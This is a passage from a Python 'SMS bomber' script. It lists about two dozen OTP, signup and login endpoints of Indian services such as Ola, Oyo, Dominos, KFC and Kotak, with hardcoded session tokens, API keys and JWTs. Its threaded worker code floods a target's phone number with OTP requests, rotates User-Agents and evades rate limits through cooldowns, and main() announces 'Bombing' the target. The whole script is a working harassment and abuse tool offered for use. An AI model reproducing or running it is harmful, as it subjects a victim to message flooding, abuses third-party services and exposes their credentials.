        "data": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu",
        "fmt": "raw",
    },
    {
        "name": "Lenskart_1",
        "method": "POST",
        "url": "https://api.lenskart.com/v2/customers/sendOtp",
        "headers": {
            "Host": "api.lenskart.com",
            "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399",
            "x-api-client": "mobilesite",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.lenskart.com",
        },
        "json": {"telephone": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "Lenskart_2",
        "method": "POST",
        "url": "https://api.lenskart.com/v2/customers/sendOtp",
        "headers": {
            "Host": "api.lenskart.com",
            "x-session-token": "59dc2d84-55e6-4fc7-be6d-958b458ccd1e",
            "x-api-client": "mobilesite",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.lenskart.com",
        },
        "json": {"telephone": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "UrbanClap",
        "method": "POST",
        "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        "headers": {
            "Host": "www.urbanclap.com",
            "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.urbancompany.com",
        },
        "json": {"country_id": "IND", "phone": {"isd_code": "+91", "phone_wo_isd": "{phone}"}, "device_type": "customer"},
        "fmt": "raw",
    },
    {
        "name": "Quikr",
        "method": "POST",
        "url": "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        "headers": {"Host": "www.quikr.com", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "origin": "https://www.quikr.com"},
        "data": "user={phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IY0gDg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true",
        "fmt": "raw",
    },
    {
        "name": "Kotak_1",
        "method": "POST",
        "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        "headers": {"Host": "www.kotak.com", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.kotak.com"},
        "data": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes",
        "fmt": "raw",
    },
    {
        "name": "HappyEasyGo",
        "method": "GET",
        "url": "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}&verifycode=FDCA",
        "headers": {"Host": "m.happyeasygo.com", "x-device": "mobile", "referer": "https://m.happyeasygo.com/register"},
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "MakeMyTrip",
        "method": "POST",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        "headers": {
            "Host": "mapi.makemytrip.com",
            "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f",
            "currency": "inr",
            "language": "eng",
            "authorization": "h4nhc9jcgpAGIjp",
            "region": "in",
            "content-type": "application/json",
        },
        "json": {"loginId": "{phone}", "type": "MOBILE", "version": 2, "countryCode": "91"},
        "fmt": "raw",
    },
    {
        "name": "Ola",
        "method": "POST",
        "url": "https://accounts.olacabs.com/api/login",
        "headers": {
            "Host": "accounts.olacabs.com",
            "x-fingerprint-id": "3664542227",
            "csrf-token": "v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I",
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/json",
            "origin": "https://accounts.olacabs.com",
        },
        "json": {"mobileNumber": "{phone}", "dialingCode": "+91", "countryCode": "IN", "headers": {}, "verificationId": None, "captchaInfo": {"fingerPrint": 3664542227, "storageId": "16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}},
        "fmt": "raw",
    },
    {
        "name": "EasyMyTrip",
        "method": "POST",
        "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        "headers": {"Host": "mybookings.easemytrip.com", "x-requested-with": "XMLHttpRequest", "content-type": "application/json; charset=UTF-8", "origin": "https://mybookings.easemytrip.com"},
        "json": {"emailph": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "Oyo_1",
        "method": "POST",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "headers": {"Host": "www.oyorooms.com", "xsrf-token": "vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0", "content-type": "text/plain;charset=UTF-8", "origin": "https://www.oyorooms.com"},
        "json": {"phone": "{phone}", "country_code": "+91", "nod": 4},
        "fmt": "raw",
    },
    {
        "name": "Oyo_2",
        "method": "POST",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "headers": {"Host": "www.oyorooms.com", "xsrf-token": "boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk", "content-type": "text/plain;charset=UTF-8", "origin": "https://www.oyorooms.com"},
        "json": {"phone": "{phone}", "country_code": "+91", "nod": 4},
        "fmt": "raw",
    },
    {
        "name": "Dominos",
        "method": "POST",
        "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
        "headers": {
            "Host": "api.dominos.co.in",
            "api_key": "d2aeb489bb8df385",
            "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
            "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840",
            "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8",
            "content-type": "application/json",
            "origin": "https://m.dominos.co.in",
        },
        "json": {"lastName": "", "mobile": "{phone}", "firstName": ""},
        "fmt": "raw",
    },
    {
        "name": "PizzaHut",
        "method": "POST",
        "url": "https://api.pizzahut.io/v1/otp/generate",
        "headers": {"Host": "api.pizzahut.io", "content-type": "application/json; charset=utf-8", "origin": "https://www.pizzahut.co.in"},
        "json": {"phone": "+91{phone}"},
        "fmt": "plus91",
    },
    {
        "name": "KFC",
        "method": "POST",
        "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
        "headers": {"Host": "online.kfc.co.in", "content-type": "application/json;charset=UTF-8", "origin": "https://online.kfc.co.in"},
        "json": {"phoneNumber": "{phone}", "AuthorizedFor": "3", "Resend": "false"},
        "fmt": "raw",
    },
    {
        "name": "BurgerKing",
        "method": "POST",
        "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        "headers": {
            "Host": "consumer-apis.burgerking.in",
            "appversion": "1.6",
            "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70",
            "content-type": "application/json",
            "timestamp": "1604561218463",
            "userid": "TEMP6922285271604561176",
            "platform": "web",
            "origin": "https://www.burgerking.in",
        },
        "json": {"phone_no": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "Dineout",
        "method": "POST",
        "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup",
        "headers": {"Host": "www.dineout.co.in", "x-requested-with": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.dineout.co.in"},
        "data": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}",
        "fmt": "raw",
    },
    {
        "name": "Purplle",
        "method": "GET",
        "url": "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
        "headers": {"Host": "www.purplle.com", "device_id": "TEC3cjyVJhEFPGsSHw", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs"},
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "AngelBroking",
        "method": "POST",
        "url": "https://www.angelbroking.com/form-gateways/oda-form.php",
        "headers": {"Host": "www.angelbroking.com", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.angelbroking.com"},
        "data": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752",
        "fmt": "raw",
    },
    {
        "name": "Cansell",
        "method": "POST",
        "url": "https://webapi.cansell.in/api/User/SignUp",
        "headers": {"Host": "webapi.cansell.in", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.cansell.in"},
        "json": {"name": "Uwusjsj", "surname": "wjeshs", "email": "hsjs@gmail.com", "phone": "{phone}", "password": "eeeeee"},
        "fmt": "raw",
    },
    {
        "name": "MedPlus",
        "method": "POST",
        "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
        "headers": {"Host": "mobile.medplusindia.com", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.medplusmart.com"},
        "data": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false",
        "fmt": "raw",
    },
    {
        "name": "Cuemath_2",
        "method": "POST",
        "url": "https://www.cuemath.com/api/v4/parents/",
        "headers": {"Host": "www.cuemath.com", "content-type": "application/JSON", "origin": "https://www.cuemath.com"},
        "json": {"intl_mobile": {"phone": "{phone}"}, "notify": ["notify_on_whatsapp"], "phone": "{phone}", "email": "tsunami@gmail.com", "full_name": "Tsunami Bomber", "timezone": "Asia/Calcutta", "notify_through": "notify_on_whatsapp", "form_fields": "full_name,email,intl_mobile"},
        "fmt": "raw",
    },
    {
        "name": "Kotak_2",
        "method": "POST",
        "url": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
        "headers": {"Host": "www.kotak.com", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.kotak.com"},
        "json": {},
        "fmt": "raw",
    },
    {
        "name": "Confirmtkt",
        "method": "GET",
        "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "headers": {"Host": "securedapi.confirmtkt.com"},
        "json": None,
        "fmt": "raw",
    },
]


def sub(value, phone, fmt):
    """Replace {phone} placeholder with formatted number."""
    if fmt == "plus91":
        num = "+91" + phone
    elif fmt == "91dash":
        num = "91-" + phone
    else:
        num = phone

    if isinstance(value, str):
        return value.replace("{phone}", num).replace("+91{phone}", "+91" + phone)
    elif isinstance(value, dict):
        return {k: sub(v, phone, fmt) for k, v in value.items()}
    elif isinstance(value, list):
        return [sub(i, phone, fmt) for i in value]
    return value


def worker(phone, stop_event):
    global sent, failed, rate_limited
    session = requests.Session()
    session.mount("https://", HTTPAdapter(pool_connections=10, pool_maxsize=10))
    session.mount("http://", HTTPAdapter(pool_connections=10, pool_maxsize=10))
    cooldown = {}

    while not stop_event.is_set():
        # pick endpoint, skip cooled-down ones
        ep = None
        for _ in range(50):
            candidate = random.choice(ENDPOINTS)
            if cooldown.get(candidate["url"], 0) < time.time():
                ep = candidate
                break
        if ep is None:
            time.sleep(2)
            continue

        url    = sub(ep["url"], phone, ep["fmt"])
        method = ep["method"]

        h = {k: v for k, v in ep.get("headers", {}).items()}
        h["User-Agent"] = random.choice(USER_AGENTS)
        h.setdefault("Accept", "application/json, text/plain, */*")
        h.setdefault("Accept-Language", "en-IN,en;q=0.9")

        json_body = sub(ep.get("json"), phone, ep["fmt"]) if ep.get("json") is not None else None
        data_body = sub(ep.get("data"), phone, ep["fmt"]) if ep.get("data") is not None else None

        try:
            if method == "GET":
                r = session.get(url, headers=h, timeout=TIMEOUT)
            elif method == "PUT":
                r = session.put(url, headers=h, json=json_body, timeout=TIMEOUT)
            else:
                r = session.post(url, headers=h, json=json_body, data=data_body, timeout=TIMEOUT)

            with lock:
                if r.status_code == 429:
                    rate_limited += 1
                    cooldown[ep["url"]] = time.time() + 120
                elif 200 <= r.status_code < 300:
                    sent += 1
                    print(f"  {G}✔{X} {D}{ep['name']:<30}{X} {G}{r.status_code}{X}")
                else:
                    failed += 1
                    if r.status_code in (400, 403, 404, 405, 410, 422):
                        cooldown[ep["url"]] = time.time() + 60

            time.sleep(random.uniform(0.3, 1.0))

        except Exception:
            with lock:
                failed += 1
                cooldown[ep["url"]] = time.time() + 60
            time.sleep(1)


def stats_display():
    global running
    while running:
        os.system("cls" if os.name == "nt" else "clear")
        print(BANNER)
        print(f"  {W}Target: {Y}{target}{X}\n")
        print(f"  {C}{'─'*40}{X}")
        with lock:
            print(f"  {G}✔  Sent        {sent}{X}")
            print(f"  {R}✘  Failed      {failed}{X}")
            print(f"  {Y}⚠  Rate-lim    {rate_limited}{X}")
        print(f"  {C}{'─'*40}{X}")
        time.sleep(STATS_REFRESH)


target = ""


def main():
    global target, running
    print(BANNER)

    if len(sys.argv) > 1:
        target = sys.argv[1].strip()
    else:
        target = input(f"{Y}  Target (10-digit): {X}").strip()

    if not target.isdigit() or len(target) != 10:
        print(f"{R}  Invalid number — must be exactly 10 digits.{X}")
        sys.exit(1)

    print(f"\n{G}  Bombing {W}{target}{G} with {len(ENDPOINTS)} verified endpoints — Ctrl+C to stop{X}\n")

    stop_event = threading.Event()
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(target, stop_event), daemon=True)
        t.start()
        threads.append(t)

    stats_thread = threading.Thread(target=stats_display, daemon=True)
    stats_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Y}  Stopping...{X}")
        running = False
        stop_event.set()
        for t in threads:
            t.join(timeout=1)
        print(f"\n  {G}Total sent: {sent}{X}  {R}Failed: {failed}{X}  {Y}Rate-limited: {rate_limited}{X}\n")


if __name__ == "__main__":
    main()